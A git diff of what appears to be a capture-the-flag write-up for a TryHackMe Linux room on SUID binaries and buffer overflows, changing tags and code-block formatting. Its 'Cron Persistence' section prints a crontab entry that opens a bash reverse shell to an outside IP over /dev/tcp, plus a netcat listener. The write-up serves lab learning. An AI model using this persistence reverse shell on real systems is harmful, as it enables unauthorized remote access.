@@ -1,11 +1,11 @@
 ---
 tags:
   - THM
-  - Linux
   - Medium
-  - File-Analysis
-  - SUID
+  - Linux
+  - Reversing
   - Scripting
+  - SUID
   - BOF
   - PATH-HJ
 ---
@@ -224,16 +224,16 @@ p.interactive()
 ```
 ## Cron Persistence
 The current session is not very stable, so we create a **cron job** to get reverse shells:
-```console
-$ echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.150.216/4444 0>&1'" | crontab -
+```bash
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.150.216/4444 0>&1'" | crontab -
 ```
 Wait for connections:
-```console
-$ nc -lvnp 4444
+```bash
+nc -lvnp 4444
 ```
 Get the **binexgod flag**:
-```console
-$ cat /home/binexgod/binexgod_flag.txt
+```bash
+cat /home/binexgod/binexgod_flag.txt
 ```
 ## Privilege Escalation
 There is another **SUID binary**, but this time owned by **root**:
